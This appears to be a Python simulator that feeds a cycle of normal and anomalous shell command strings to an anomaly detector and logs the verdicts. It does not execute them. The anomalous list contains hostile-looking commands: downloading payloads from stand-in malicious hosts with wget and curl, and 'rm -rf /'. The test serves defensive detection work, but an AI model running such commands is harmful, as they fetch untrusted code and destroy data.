import time
from detector import predict
from writer import write_log

user = "simulator"

normal_cmds = [
    "ps -e -o pid,ppid,state,command",
    "ls -al /var/log",
    "df -h",
    "cd /home",
    "cat /etc/passwd",
]

abnormal_cmds = [
    "wget http://evil.sh",
    "curl http://malicious.site/payload.sh",
    "rm -rf /",
]

i = 0
while True:
    # 5개는 정상 명령어
    cmd = normal_cmds[i % len(normal_cmds)]
    is_anomaly = predict(cmd)
    now_ns = int(time.time() * 1e9)
    write_log(user, cmd, is_anomaly, now_ns)
    print(f"[{i+1}] [OK] {cmd}")
    time.sleep(1)
    i += 1

    # 1개는 이상 명령어
    if i % 5 == 0:
        ab_cmd = abnormal_cmds[(i // 5) % len(abnormal_cmds)]
        is_anomaly = predict(ab_cmd)
        now_ns = int(time.time() * 1e9)
        write_log(user, ab_cmd, is_anomaly, now_ns)
        print(f"[{i+1}] [ANOMALY] {ab_cmd}")
        time.sleep(1)
        i += 1
